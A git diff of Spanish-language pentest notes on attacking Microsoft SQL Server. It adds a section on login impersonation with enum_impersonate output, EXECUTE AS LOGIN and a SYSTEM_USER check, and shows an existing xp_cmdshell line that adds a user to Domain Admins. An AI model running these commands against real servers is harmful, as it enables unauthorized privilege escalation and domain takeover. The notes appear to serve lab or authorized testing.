@@ -41,6 +41,32 @@
 - `EXEC xp_cmdshell 'net group "Domain Admins" manager\operator /add /domain';`
 
 
+## Impersonar credenciales
+- `enum_impersonate`: esto te va a dar posibles usuarios que podemos impersonar
+
+```
+ 
+execute as   database   permission_name   state_desc   grantee          grantor          
+----------   --------   ---------------   ----------   --------------   --------------   
+b'LOGIN'     b''        IMPERSONATE       GRANT        HAERO\services   hrappdb-reader   
+
+``` 
+
+- `EXECUTE AS LOGIN = 'hrappdb-reader';`
+- `SELECT SYSTEM_USER;`: Para chequear
+
+```
+
+SQL (hrappdb-reader  guest@master)> SELECT SYSTEM_USER;
+[%] SELECT SYSTEM_USER;
+                 
+--------------   
+hrappdb-reader   
+```
+
+
+
+
 #### Herramientas utiles
 - Impacket
 - PowerUpSQL
